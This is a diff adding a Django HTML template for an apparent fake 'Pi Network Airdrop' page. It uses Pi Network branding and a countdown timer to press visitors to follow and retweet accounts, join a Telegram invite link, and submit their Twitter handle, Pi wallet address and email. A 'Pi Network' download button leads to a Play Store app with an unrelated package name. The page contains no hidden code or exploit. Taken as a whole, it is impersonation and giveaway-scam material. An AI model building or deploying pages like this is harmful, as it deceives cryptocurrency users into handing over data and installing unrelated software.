@@ -1,0 +1,402 @@
+{% load static %}
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <link rel="stylesheet" href="{% static 'css/style2.css' %}">
+    <link rel="stylesheet" href="{% static 'css/kk.css' %}">
+    <title>Pi Network - Pi Blockchain, Community & Developer Platform</title>
+    <link rel="icon" type="image/x-icon" href="{% static 'images/logo.png' %}">
+    <link rel="preconnect" href="https://fonts.googleapis.com"><link rel="preconnect" href="https://fonts.gstatic.com" crossorigin><link href="https://fonts.googleapis.com/css2?family=Montserrat:wght@500&display=swap" rel="stylesheet">
+</head>
+<body>
+    <div class="body">
+      <nav class="navbar">
+        <div class="container">
+          <a class="navbar-brand" href="/"/>
+            <img alt="logo" src="{% static 'images/logo.png' %}" />
+            <span>Pi Network</span>
+          </a>
+           </div>
+            <div class="collapse navbar-collapse" id="main-nav">
+              <ul class="navbar-nav ml-auto">
+                <li class="nav-item">
+                  <a class="nav-link" href=/>Home</a>
+                </li>
+                <li class="nav-item">
+                  <a class="nav-link" href="https://node.minepi.com/">Pi node</a>
+                </li>
+                <li class="nav-item hidden-mobile">
+                  <a
+                    class="nav-link"
+                    href=/#download
+                  >
+                    Mobile app
+                  </a>
+                </li>
+                <li class="nav-item hidden-desktop">
+                  <a
+                    class="nav-link"
+                    href=/#download_mobile
+                  >
+                    Mobile app
+                  </a>
+                </li>
+                <li class="nav-item">
+                  <a class="nav-link" href="https://developers.minepi.com">Platform</a>
+                </li>
+                <li class="nav-item">
+                  <a class="nav-link" href="#">Team</a>
+                </li>
+                <li class="nav-item">
+                  <a class="nav-link" href="#">Support</a>
+                </li>
+      
+              </ul>
+            </div>
+      </nav>
+      <main>
+          <div class="container">
+            <div class="col">
+              <div class="p-3 border" style="border-radius: 10px; padding: 10px; box-shadow: 1px 1px 5px; width: 60% ; background-color: #DCDCDC; position: absolute; left: 50%; transform: translateX(-50%); width: 30%; text-align: center;"><b style="font-size: 20px;" id="demo">
+        
+       </b><br>Days Left</div><br>
+            </div>
+              <div style="margin-top: 60px;" class="header">
+                
+                  <h2>Pi Network Airdrop</h2>
+              </div>
+              <div class="requirements">
+                  <strong>Airdrop Requirements</strong><br>
+                  1. Follow Pi Network official Twitter: <a href="twitter.com/PiCoreTeam">//twitter.com/PiCoreTeam</a><br>
+                  2. Join Pi Network Airdrop official Chanell : Telegram: <a href="https://t.me/+sNlsYgEj18M2ZWFk">https://t.me/+sNlsYgEj18M2ZWFk</a><br>
+                  3. Comment and retweet these tweets + tag 2 friends.<br>
+  
+                  <a href="https://twitter.com/PiCoreTeam">https://twitter.com/PiCoreTeam</a>
+              </div>
+              <form method="POST">
+                {% csrf_token %}
+                
+                <div class="field">
+                  <label for="">Twitter Username</label>
+                  <div>{{form.twitter_username}}</div>
+              </div>
+              <div class="field">
+                  <label for="">Pi Network Address</label>
+                  <div>{{form.pinetwork_address}}</div>
+              </div>
+              <div class="field">
+                  <label for="">1.Follow  Pi Network Twitter Account</label>
+                  <div><input type="checkbox" required><strong>Done</strong></div>
+              </div>
+              <div class="field">
+                  <label for="">2.Join Pi Network Airdrop Official Telegram Channel</label>
+                  <div><input type="checkbox" required><strong>Done</strong></div>
+              </div>
+              <div class="field">
+                  <label for="">3.Comment and retweet these two tweets + tag 2 friends</label>
+                  <div><input type="checkbox" required><strong>Done</strong></div>
+              </div>
+              <div class="field">
+                  <label for="">4.Insert Link your twitter comment</label>
+                  <div>{{form.twitter_comment}}</div>
+              </div>
+              <div class="field">
+                  <label for="">Email</label>
+                  <div>{{form.email}}</div>
+              </div>
+              <div class="btn">
+                  <button class="btn" type="submit">Submit</button>
+              </div>
+              </form>
+          </div>
+      </main>
+  
+      <!-- /**********************************************/ -->
+  
+  
+  
+      <nav class="nav2">
+        <div class="container">
+          <a class="navbar-brand" href="/"/>
+            <img alt="logo" src="{% static 'images/logo.png' %}" />
+            <span>Pi Network</span>
+          </a>
+           </div>
+           <div class="btn">
+            <img class="img_btn" src="assets/images/bars.png" alt="">
+          </div>
+      </nav>
+      <div id="main-nav" class="navig">
+        <ul class="navbar-nav ml-auto">
+          <li class="nav-item">
+            <a class="nav-link" href="#"/>Home</a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link" href="https://node.minepi.com/">Pi node</a>
+          </li>
+          <li class="nav-item hidden-mobile">
+            <a
+              class="nav-link"
+              href="#"
+            >
+              Mobile app
+            </a>
+          </li>
+          <li class="nav-item hidden-desktop">
+            <a
+              class="nav-link"
+              href="#"
+            >
+              Mobile app
+            </a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link" href="https://developers.minepi.com">Platform</a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link" href="#">Team</a>
+          </li>
+          <li class="nav-item">
+            <a class="nav-link" href="#">Support</a>
+          </li>
+  
+        </ul>
+      </div>
+  
+  
+      
+      <div style=" padding: 5px;" class="main_2">
+        <div  class="container">
+          <div class="col">
+            <div class="p-3 border" style="border-radius: 10px; padding: 10px; box-shadow: 1px 1px 5px; width: 60% ; background-color: #DCDCDC; position: absolute; left: 50%; transform: translateX(-50%); width: 50%; text-align: center; margin-top: 10px;"><b style="font-size: 20px;" id="demo2">
+      
+     </b><br>Days Left</div><br>
+          </div>
+            <div style="margin-top: 70px;" class="header">
+                <h2>Pi Network Airdrop</h2>
+            </div>
+            <div style="margin-top: 15px;" class="requirements">
+                Airdrop Requirements<br>
+                1. Follow Pi Network official Twitter: <a href="twitter.com/PiCoreTeam">//twitter.com/PiCoreTeam</a><br>
+                2. Join Pi Network Airdrop official Chanell : Telegram: <a href="https://t.me/+sNlsYgEj18M2ZWFk">https://t.me/+sNlsYgEj18M2ZWFk 3</a><br>
+                3. Comment and retweet these tweets + tag 2 friends.<br>
+  
+                <a href="https://twitter.com/PiCoreTeam">https://twitter.com/PiCoreTeam</a>
+            </div>
+            <form method="POST">
+              {% csrf_token %}
+              
+              <div class="field">
+                <label for="">Twitter Username</label>
+                <div>{{form.twitter_username}}</div>
+            </div>
+            <div class="field">
+                <label for="">Pi Network Address</label>
+                <div>{{form.pinetwork_address}}</div>
+            </div>
+            <div class="field">
+                <label for="">1.Follow  Pi Network Twitter Account</label>
+                <div><input type="checkbox" required><strong>Done</strong></div>
+            </div>
+            <div class="field">
+                <label for="">2.Join Pi Network Airdrop Official Telegram Channel</label>
+                <div><input type="checkbox" required><strong>Done</strong></div>
+            </div>
+            <div class="field">
+                <label for="">3.Comment and retweet these two tweets + tag 2 friends</label>
+                <div><input type="checkbox" required><strong>Done</strong></div>
+            </div>
+            <div class="field">
+                <label for="">4.Insert Link your twitter comment</label>
+                <div>{{form.twitter_comment}}</div>
+            </div>
+            <div class="field">
+                <label for="">Email</label>
+                <div>{{form.email}}</div>
+            </div>
+            <div class="btn">
+                <button class="btn" type="submit">Submit</button>
+            </div>
+            </form>
+        </div>
+    </div>
+    </div>
+    <div class="bottom-space"></div>
+
+    <div class="download_banner_1">
+     
+        <div class="container">
+          
+            <div><strong>Pi Network</strong>
+            <br>
+                <p id="uu">Start mining. Easy as Pi!</p>
+            </div>
+          
+          
+            <a class="download_app" onclick="send_download_stat()" target="_blank" href="https://play.google.com/store/apps/details?id=com.blockchainvault">
+              Download
+            </a>
+          
+        </div>
+      
+    </div>
+<style>
+  .main_2 .container{
+    box-shadow: 2px 2px 5px rgb(32, 32, 32);
+    background-color: rgb(242, 242, 242) !important;
+  }
+  .main_2 .container .field{
+    background-color: white;
+    border-color: rgb(215, 215, 215) !important;
+    border-radius: 5px;
+    padding: 17px !important;
+  }
+@media (max-width: 800px) {
+  .container .header h2{
+    font-size: 40px;
+  }
+  body{
+    height: 1290px !important;
+  }
+   
+   .download_banner_1{
+       background-color: #cfcfcf;
+       height: 50px;
+       position: fixed;
+       bottom: 0;
+       width: 100%;
+       display: flex;
+       justify-content: center;
+   }
+   .download_banner_1 .container{
+       display: flex;
+       justify-content: space-around;
+       align-items: center;
+       width: 90%;
+   }
+   .download_banner_1 .container a{
+       background-color: orange;
+       padding: 6px 12px;
+       color: #000;
+       font-weight: bold;
+       font-family: inherit;
+       text-decoration: none;
+   }
+   #uu{
+    font-size: 14px;
+   }
+
+}
+
+
+@media (min-width:800px) {
+  
+   #main-nav{
+       display: block;
+   }
+   .navig,#main-nav.navig{
+       display: none;
+   }
+   .download_banner_1{
+       background-color: #cfcfcf;
+       height: 50px;
+       position: fixed;
+       bottom: 0;
+       width: 100%;
+       display: flex;
+       justify-content: space-around;
+   }
+   .download_banner_1 .container{
+       display: flex;
+       justify-content: space-evenly;
+       align-items: center;
+       width: 80%;
+   }
+   .download_banner_1 .container a{
+    text-decoration: none;
+       background-color: orange;
+       padding: 6px 12px;
+       color: #000;
+       font-weight: bold;
+       font-family: inherit;
+   }
+}
+
+.download_banner{
+   display: flex;
+   justify-content: space-evenly;
+   background-color: #000;
+}
+.download_banner div{
+   width:100px;
+   margin: 0 0 0 10px;
+}
+.download_banner .right_side{
+   display: flex;
+   align-items: center;
+}
+
+
+
+
+</style>
+    <script>
+      const navig=document.querySelector(".navig");
+      const img_btn=document.querySelector(".img_btn");
+      img_btn.addEventListener("click",function(){
+        if(navig.style.display==""){
+          navig.style.display="block";
+        }else{
+          navig.style.display="";
+        }
+      });
+    </script>
+
+<script>
+  // Set the date we're counting down to
+  var countDownDate = new Date("Feb 25, 2023 23:59:00").getTime();
+  
+  // Update the count down every 1 second
+  var x = setInterval(function() {
+  
+    // Get today's date and time
+    var now = new Date().getTime();
+      
+    // Find the distance between now and the count down date
+    var distance = countDownDate - now;
+      
+    // Time calculations for days, hours, minutes and seconds
+    var days = Math.floor(distance / (1000 * 60 * 60 * 24));
+    var hours = Math.floor((distance % (1000 * 60 * 60 * 24)) / (1000 * 60 * 60));
+    var minutes = Math.floor((distance % (1000 * 60 * 60)) / (1000 * 60));
+    var seconds = Math.floor((distance % (1000 * 60)) / 1000);
+      
+    // Output the result in an element with id="demo"
+    document.getElementById("demo2").innerHTML = days + "d " + hours + "h "
+    + minutes + "m " + seconds + "s ";
+      
+    // If the count down is over, write some text 
+    if (distance < 0) {
+      clearInterval(x);
+      document.getElementById("demo2").innerHTML = "EXPIRED";
+    }
+    // Output the result in an element with id="demo"
+    document.getElementById("demo").innerHTML = days + "d " + hours + "h "
+    + minutes + "m " + seconds + "s ";
+      
+    // If the count down is over, write some text 
+    if (distance < 0) {
+      clearInterval(x);
+      document.getElementById("demo").innerHTML = "EXPIRED";
+    }
+
+
+  }, 1000);
+
+  
+  </script>
+</body>
+</html>
